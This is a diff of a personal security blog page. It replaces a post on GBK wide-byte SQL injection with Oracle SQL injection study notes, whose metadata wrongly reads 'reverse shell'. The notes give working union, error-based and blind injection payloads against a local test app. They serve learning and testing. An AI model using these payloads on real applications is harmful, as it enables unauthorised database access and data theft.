@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SQL宽字节注入, wuk0Ng">
+    <meta name="keywords" content="反弹shell, wuk0Ng">
     <meta name="description" content="wuk0Ng的个人博客">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SQL宽字节注入 | wuk0Ng</title>
+    <title>反弹shell | wuk0Ng</title>
     <link rel="icon" type="image/jpeg" href="/shaoqing.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -320,12 +320,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SQL宽字节注入</h1>
+                    <h1 class="description center-align post-title">反弹shell</h1>
                 </div>
             </div>
         </div>
@@ -441,12 +441,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
+                            <a href="/tags/SRC/">
+                                <span class="chip bg-color">SRC</span>
                             </a>
                         
-                            <a href="/tags/%E8%AE%B0%E5%BD%95/">
-                                <span class="chip bg-color">记录</span>
+                            <a href="/tags/SQL/">
+                                <span class="chip bg-color">SQL</span>
                             </a>
                         
                     </div>
@@ -491,17 +491,108 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h1><p>①将需要进行编码的字符替换：为其对应的编码形式，使用 “%” 其后跟随两位的十六进制数来替换非 ASCII 字符。<br>②对于URL中的保留字符，也需要进行编码。<br>③URL 不能包含空格，通常使用加号（+）或 %20 替代空格。<br>④其他字符出现在 URL 之中都必须转义，规则是根据操作系统的默认编码，将每个字节转为百分号（%）加上两个大写的十六进制字</p>
-<h1 id="UTF-8编码"><a href="#UTF-8编码" class="headerlink" title="UTF-8编码"></a>UTF-8编码</h1><p>UTF-8是针对Unicode的一种可变长度字符编码。它可以用来表示Unicode标准中的任何字符，而且其编码中的第一个字节仍与ASCII相容，使得原来处理ASCII字符的软件无需或只进行少部分修改后，便可继续使用。<br>基本特征<br>UCS字符U+0000到U+007F（ASCII）被编码为字节0x00到0x7F（ASCII兼容）。这意味着只包含7位ASCII字符的文件在ASCII和UTF-8两种编码方式下是一样的。<br>所有大于0x007F的UCS字符被编码为一个有多个字节的串，每个字节都有标记位集。</p>
-<p>因此，ASCII字节（0x00-0x7F）不可能作为任何其他字符的一部分。表示非ASCII字符的多字节串的第一个字节总是在0xC0到0XFD的范围里，并指出这个字符包含多少个字节。多字节串的其余字节都在0x80到0xBF范围里。这使得重新同步非常容易，并使编码无国界，且很少受丢失字节的影响。<br>UTF8分成单字节、双字节、三字节、四字节模式。<br>UTF-8编码字符理论上可以最多到4个字节长，然而16位BMP字符最多只用到3字节长， UCS-4字节串的排列顺序是预定的，字节0xFE和0xFF在UTF-8编码中从未用到。<br>编码字节数<br>UTF-8使用1<del>4字节为每个字符编码：<br>·一个US-ASCIl字符只需1字节编码（Unicode范围由U+0000</del>U+007F）。<br>·带有变音符号的拉丁文、希腊文、西里尔字母、亚美尼亚语、希伯来文、阿拉伯文、叙利亚文等字母则需要2字节编码（Unicode范围由U+0080~U+07FF）。<br>·其他语言的字符（包括中日韩文字、东南亚文字、中东文字等）包含了大部分常用字，使用3字节编码。<br>·其他极少使用的语言字符使用4字节编码。<br>字符集<br>UTF-8编码规则：如果只有一个字节则取值为0x00-0x7F。其余字节按长度进行以下拓展：<br>UTF-8由4种编码方式实现，即UTF8-1&#x2F;UTF8-2&#x2F;UTF8-3&#x2F;UTF8-4<br>其中：<br>UTF8, 16进制编码表<br>UTF8-1<br>0x00-0x7F<br>UTF8-2<br>0xC2-0xDF 0x80-0xBF<br>UTF8-3<br>0xE0 0xA0-0xBF 0x80-0xBF<br>0xE1-0xEC 0x80-0xBF 0x80-0xBF<br>0xED 0x80-0x9F 0x80-0xBF<br>0xEE-0xEF 0x80-0xBF 0x80-0xBF<br>UTF8-4<br>0xF0 0x90-0xBF 0x80-0xBF 0x80-0xBF<br>0xF1-0xF3 0x80-0xBF 0x80-0xBF 0x80-0xBF<br>0xF4 0x80-0x8F 0x80-0xBF 0x80-0xBF<br>每种编码可能有多个编码范围，每个编码范围间，以空格作为每个字节的分隔符。UTF8-3的第一个编码，其第一个字节取值必须为0xE0，第二个字节范围为0xA0-0xBF，第三个字节为0x80-0xBF</p>
-<h1 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h1><p>‌Unicode编码‌是一种字符编码规范，旨在为世界上每一种文字系统的每一个字符分配一个唯一的整数编号，从而避免任何冲突。Unicode编码规则的核心在于其分配机制和编码格式。‌</p>
-<p>Unicode编码规则的核心概念<br>①码点（Code Point）‌：每个字符都被分配一个唯一的码点，格式为U+[XX]XXXX，范围从U+0000到U+10FFFF，足以容纳超过100万个字符。<br>‌②字符平面：Unicode采用分组的方式存储字符，每个组称为一个平面，每个平面能容纳65536个字符。<br>Unicode编码的分配机制<br>Unicode通过两个主要的编码格式来存储字符：</p>
-<p>‌UTF-16‌：这是Unicode的缺省编码格式，每个字符占用16位（两个字节）。对于一些扩展字符，UTF-16使用一对代用字符进行编码，高位代用字符在U+D800到U+DBFF之间，低位代用字符在U+DC00到U+DFFF之间。<br>‌UTF-8‌：这是一种变长的编码格式，适用于面向字节基于ASCII的应用程序和文件系统。UTF-8可以将Unicode字符转换为变长的ASCII安全的字节字符串，非补充字符最多占用3个字节，补充字符最多占用4个字节。</p>
-<h1 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h1><p>宽字节注入是一种SQL注入攻击方式。在数据库使用GBK等宽字节编码（且必须是GBK编码时才可以用宽字节注入，其他不行）时，一个汉字占两个字节。</p>
-<p>在PHP中，当开启 magic_quotes_gpc （该函数会对特殊字符转义）后，输入的单引号 ‘ 前自动加上转义符’ &#39; ,从而让单引号‘失效。<br>攻击者利用宽字节编码特性，通过输入特定字节序列，让转义符号 \ 与后面字节组成一个汉字，从而使单引号 ‘ 能发挥SQL注入作用，达到恶意攻击目的。<br>eg:</p>
-<p>一个登录验证的SQL语句为select * from users where username&#x3D;’𝑢𝑠𝑒𝑟𝑛𝑎𝑚𝑒′𝑎𝑛𝑑𝑝𝑎𝑠𝑠𝑤𝑜𝑟𝑑&#x3D;′<br>password’ 。</p>
-<p>正常情况下，若用户的输入包含单引号会被转义。<br>但攻击者在用户名输入框输入 %df’ or 1&#x3D;1# （这里 %df 在GBK编码下与转义字符 \ 组成一个汉字），SQL语句就会变成 select * from users where username&#x3D;’汉字’ or 1&#x3D;1# and password&#x3D;’$password’ ，这样就绕过了原本基于用户名的验证，使攻击者可能成功登录系统。</p>
+                <p>参考大佬文章<br><a target="_blank" rel="noopener" href="https://y4er.com/posts/oracle-sql-inject/">https://y4er.com/posts/oracle-sql-inject/</a></p>
+<h1 id="oracle-SQL注入学习"><a href="#oracle-SQL注入学习" class="headerlink" title="oracle SQL注入学习"></a>oracle SQL注入学习</h1><p>oracle注入</p>
+<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>oracle和MYSQL数据库语法大致相同，结构不太一样。最大的一个特点就是oracle可以调用java代码</p>
+<p>对于“数据库”这个概念而言，Oracle采用了”表空间“的定义。数据文件就是由多个表空间组成的，这些数据文件和相关文件形成一个完整的数据库。当数据库创建时，Oracle 会默认创建五个表空间：SYSTEM、SYSAUX、USERS、UNDOTBS、TEMP：</p>
+<p>SYSTEM：看名字就知道这个用于是存储系统表和管理配置等基本信息<br>SYSAUX：类似于 SYSTEM，主要存放一些系统附加信息，以便减轻 SYSTEM 的空间负担<br>UNDOTBS：用于事务回退等<br>TEMP：作为缓存空间减少内存负担<br>USERS：就是存储我们定义的表和数据</p>
+<p>在oralce中每个表空间均存在一张dual表，这张表是虚表，并没有实际的存储意义，因为oracle的SQL语法要求select后必须跟上from，所以我们通常使用dual来作为计算，查询时间等SQL语句中from之后的虚表占位，也就是select 1+1 from dual</p>
+<p>再来看Oracle中用户和权限划分：Oracle 中划分了许多用户权限，权限的集合称为角色。例如 CONNECT 角色具有连接到数据库权限，RESOURCE 能进行基本的增删改查，DBA 则集合了所有的用户权限。在创建数据库时，会默认启用 sys、system 等用户：</p>
+<p>sys：相当于 Linux 下的 root 用户。为 DBA 角色<br>system：与 sys 类似，但是相对于 sys 用户，无法修改一些关键的系统数据，这些数据维持着数据库的正常运行。为 DBA 角色。<br>public：public 代指所有用户（everyone），对其操作会应用到所有用户上（实际上是所有用户都有 public 用户拥有的权限，如果将 DBA 权限给了 public，那么也就意味着所有用户都有了 DBA 权限）</p>
+<h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select column, group_function(column)</span><br><span class="line">from table</span><br><span class="line">[where condition]</span><br><span class="line">[group by group_by_expression]</span><br><span class="line">[having group_condition]</span><br><span class="line">[order by column];</span><br></pre></td></tr></table></figure>
+<p>oracle要求select后必须指明要查询的表名，可以用dual<br>oracle使用||拼接字符串，MYSQL中为或运算<br>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;a&#x27;||&#x27;a&#x27; from dual;</span><br><span class="line">result:aa</span><br></pre></td></tr></table></figure>
 
+<p>单引号和双引号在ORACLE中虽然都是字符串，但是双引号可以用来消除关键字，比如sysdate。<br>ORACLE中limit应该使用虚表中的rownum字段通过where条件判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from test where rownum=1;</span><br><span class="line">result:admin-password这样的一个信息</span><br></pre></td></tr></table></figure>
+<p>Oracle中没有空字符，’’和’null’都是null，而MySQL中认为’’仍然是一个字符串。</p>
+<p>Oracle对数据格式要求严格，比如union select的时候，放到下文讲。</p>
+<p>Oracle的系统表：</p>
+<p>dba_tables : 系统里所有的表的信息，需要DBA权限才能查询<br>all_tables : 当前用户有权限的表的信息<br>user_tables: 当前用户名下的表的信息<br>DBA_ALL_TABLES：DBA 用户所拥有的或有访问权限的对象和表<br>ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表<br>USER_ALL_TABLES：某一用户所拥有的对象和表<br>DBA_TABLES &gt;&#x3D; ALL_TABLES &gt;&#x3D; USER_TABLES</p>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>以注入点<a target="_blank" rel="noopener" href="http://localhost:8080/oracleInject/index?username=admin%E4%B8%BA%E4%BE%8B%E8%AE%B2%E8%A7%A3%E3%80%82%E4%BB%A3%E7%A0%81%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E4%B8%AAjsp%E7%BD%91%E9%A1%B5%E5%B0%B1%E8%A1%8C%E4%BA%86">http://localhost:8080/oracleInject/index?username=admin为例讲解。代码随便写一个jsp网页就行了</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL语句：select * from test where username=&#x27;admin&#x27;</span><br><span class="line">result：id1,账号admin，密码：adminpass</span><br></pre></td></tr></table></figure>
+<p>获取数据库版本信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oracleInject/index?username=admin&#x27; union select 1,&#x27;a&#x27;,(SELECT banner FROM v$version WHERE banner LIKE &#x27;Oracle%25&#x27;) from dual -- +</span><br><span class="line"></span><br><span class="line">提交</span><br><span class="line">select from test where username= admin&#x27;union select 1, a. (SELECT banner FROM vsversion WHERE banner LIKE Oracle%) from dual-</span><br><span class="line">id账号</span><br><span class="line">密码</span><br><span class="line">Oracle Database 12c Enterprise Edition Release 12.1.0.2.0 - 64bit Production</span><br><span class="line">a</span><br><span class="line">Iadmin</span><br><span class="line">adminpass</span><br></pre></td></tr></table></figure>
+
+<p>获取操作系统版本信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oracleInject/index?username=admin&#x27; union select 1,&#x27;a&#x27;,(SELECT banner FROM v$version where banner like &#x27;TNS%25&#x27;) from dual -- +</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select*from test where username= admin&#x27; union select 1, a.(SELECT banner FROM VSversion where banner like TNs%) from dual</span><br><span class="line">id账号</span><br><span class="line">密码</span><br><span class="line">1</span><br><span class="line">a TNS for 64-bit Windows: Version 12.1.0.2.0 - Production</span><br><span class="line">1 admin</span><br><span class="line">adminpass</span><br></pre></td></tr></table></figure>
+
+<p>获取当前数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from test where username=&#x27;admin&#x27; union select 1,&#x27;a&#x27;(SELECT name FROM vSdatabase) from dual</span><br><span class="line">id 账号</span><br><span class="line">a</span><br><span class="line">密码</span><br><span class="line">ORCL</span><br><span class="line">I admin adminpass</span><br></pre></td></tr></table></figure>
+
+<p>获取数据库用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT user FROM dual;</span><br></pre></td></tr></table></figure>
+
+<p>获取所有数据库用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT username FROM all_users;</span><br><span class="line">SELECT name FROM sys.user$; -- 需要高权限</span><br></pre></td></tr></table></figure>
+
+<p>获取当前用户权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM session_privs</span><br></pre></td></tr></table></figure>
+
+<p>获取当前用户有权限的所有数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT owner, table_name FROM all_tables</span><br></pre></td></tr></table></figure>
+
+
+<p>获取表，all_tables类似于MySQL中的information_schema.tables，里面的结构可以自己构造sql语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM all_tables;</span><br></pre></td></tr></table></figure>
+
+<p>获取字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM all_tab_columns</span><br></pre></td></tr></table></figure>
+
+<p>在Oracle启动时，在 userenv 中存储了一些系统上下文信息，通过 SYS_CONTEXT 函数，我们可以取回相应的参数值。包括当前用户名等等。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SYS_CONTEXT（&#x27;USERENV&#x27;，&#x27;SESSION_USER&#x27;） from dual;</span><br></pre></td></tr></table></figure>
+
+<h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>order by 猜字段数量，union select进行查询，需要注意的是每一个字段都需要对应前面select的数据类型(字符串&#x2F;数字)。所以我们一般先使用null字符占位，然后逐位判断每个字段的类型，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oracleInject/index?username=admin&#x27; union select null,null,null from dual -- 正常</span><br><span class="line">http://localhost:8080/oracleInject/index?username=admin&#x27; union select 1,null,null from dual -- 正常说明第一个字段是数字型</span><br><span class="line">http://localhost:8080/oracleInject/index?username=admin&#x27; union select 1,2,null from dual -- 第二个字段为数字时错误</span><br><span class="line">http://localhost:8080/oracleInject/index?username=admin&#x27; union select 1,&#x27;asd&#x27;,null from dual -- 正常 为字符串 依此类推</span><br></pre></td></tr></table></figure>
+<p>查数据库版本和用户名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oracleInject/index?username=admin&#x27; union select 1,(select user from dual),(SELECT banner FROM v$version where banner like &#x27;Oracle%25&#x27;) from dual -- </span><br></pre></td></tr></table></figure>
+<p>查当前数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oracleInject/index?username=admin&#x27; union select 1,(SELECT global_name FROM global_name),null from dual -- </span><br></pre></td></tr></table></figure>
+
+
+<p>查表，wmsys.wm_concat()等同于MySQL中的group_concat()，在11gr2和12C上已经抛弃，可以用LISTAGG()替代</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oracleInject/index?username=admin&#x27; union select 1,(select LISTAGG(table_name,&#x27;,&#x27;)within group(order by owner)name from all_tables where owner=&#x27;SYSTEM&#x27;),null from dual -- </span><br></pre></td></tr></table></figure>
+
+<p>但是LISTAGG()返回的是varchar类型，如果数据表很多会出现字符串长度过长的问题。这个时候可以使用通过字符串截取来进行。<br>查字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oracleInject/index?username=admin&#x27; union select 1,(select column_name from all_tab_columns where table_name=&#x27;TEST&#x27; and rownum=2),null from dual -- </span><br></pre></td></tr></table></figure>
+<p>有表名字段名出数据就不说了。</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>5.1 utl_inaddr.get_host_name</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_inaddr.get_host_name((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+<p>11g之后，使用此函数的数据库用户需要有访问网络的权限</p>
+<p>5.2 ctxsys.drithsx.sn</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ctxsys.drithsx.sn(1, (select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+<p>处理文本的函数，参数错误时会报错。</p>
+<p>5.3 CTXSYS.CTX_REPORT.TOKEN_TYPE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), &#x27;123&#x27;) from dual;</span><br></pre></td></tr></table></figure>
+<p>5.4 XMLType<br>我在12c中测试失败。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oracleInject/index?username=admin&#x27; and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --</span><br></pre></td></tr></table></figure>
+<p>注意url编码，如果返回的数据有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出。</p>
+<p>5.5 dbms_xdb_version.checkin</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.checkin((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+<p>5.6 dbms_xdb_version.makeversioned</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.makeversioned((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+<p>5.7 dbms_xdb_version.uncheckout</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.uncheckout((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+<p>5.8 dbms_utility.sqlid_to_sqlhash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+<p>5.9 ordsys.ord_dicom.getmappingxpath</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual;</span><br></pre></td></tr></table></figure>
+<p>5.10 UTL_INADDR.get_host_name</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select UTL_INADDR.get_host_name((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+<p>5.11 UTL_INADDR.get_host_address</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select UTL_INADDR.get_host_name(&#x27;~&#x27;||(select user from dual)||&#x27;~&#x27;) from dual;</span><br></pre></td></tr></table></figure>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>6.1布尔盲注</p>
+<p>布尔盲注第一种是可以使用简单的字符串比较来进行，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oracleInject/index?username=admin&#x27; and (select substr(user, 1, 1) from dual)=&#x27;S&#x27; --</span><br></pre></td></tr></table></figure>
+<p>然后还有一种是通过decode配合除数为0来进行布尔盲注。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oracleInject/index?username=admin&#x27; and 1=(select decode(substr(user, 1, 1), &#x27;S&#x27;, (1/1),0) from dual) --</span><br></pre></td></tr></table></figure>
+<p>6.2时间盲注<br>大量数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from all_objects</span><br></pre></td></tr></table></figure>
+<p>缺点就是不准</p>
+<p>时间延迟函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from dual where DBMS_PIPE.RECEIVE_MESSAGE(&#x27;asd&#x27;, REPLACE((SELECT substr(user, 1, 1) FROM dual), &#x27;S&#x27;, 10))=1;</span><br></pre></td></tr></table></figure>
+<p>还可以配合decode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;RDS&#x27;,10),0) from dual;</span><br></pre></td></tr></table></figure>
                 
             </div>
             <hr/>
@@ -527,7 +618,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://web-wuk0ng.github.io/2026/05/23/SQL%E6%B3%A8%E5%85%A5%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">https://web-wuk0ng.github.io/2026/05/23/SQL%E6%B3%A8%E5%85%A5%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</a>
+                    <a href="https://web-wuk0ng.github.io/2026/05/23/oracle%E6%B3%A8%E5%85%A5/">https://web-wuk0ng.github.io/2026/05/23/oracle%E6%B3%A8%E5%85%A5/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -565,12 +656,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
+                                <a href="/tags/SRC/">
+                                    <span class="chip bg-color">SRC</span>
                                 </a>
                             
-                                <a href="/tags/%E8%AE%B0%E5%BD%95/">
-                                    <span class="chip bg-color">记录</span>
+                                <a href="/tags/SQL/">
+                                    <span class="chip bg-color">SQL</span>
                                 </a>
                             
                         </div>
@@ -745,7 +836,7 @@
     repo: 'blog---comments',
     owner: 'web-wuk0Ng',
     admin: ["web-wuk0Ng"],
-    id: '2026-05-23T13-30-00',
+    id: '2026-05-23T16-00-00',
     distractionFreeMode: false
   });
 
@@ -771,9 +862,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2026/05/23/oracle%E6%B3%A8%E5%85%A5/">
                     <div class="card-image">
@@ -791,9 +883,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2026-05-23
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-05-23
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -806,6 +898,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -828,13 +921,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2026/04/25/bp%E7%94%A8%E6%9D%A5%E5%B9%B6%E5%8F%91/">
+                <a href="/2026/05/23/SQL%E6%B3%A8%E5%85%A5%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="bp并发操作">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="SQL宽字节注入">
                         
-                        <span class="card-title">bp并发操作</span>
+                        <span class="card-title">SQL宽字节注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -845,7 +938,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2026-04-25
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-05-23
                             </span>
                         <span class="publish-author">
                             
@@ -862,12 +955,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/SRC/">
-                        <span class="chip bg-color">SRC</span>
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
-                    <a href="/tags/bp/">
-                        <span class="chip bg-color">bp</span>
+                    <a href="/tags/%E8%AE%B0%E5%BD%95/">
+                        <span class="chip bg-color">记录</span>
                     </a>
                     
                 </div>
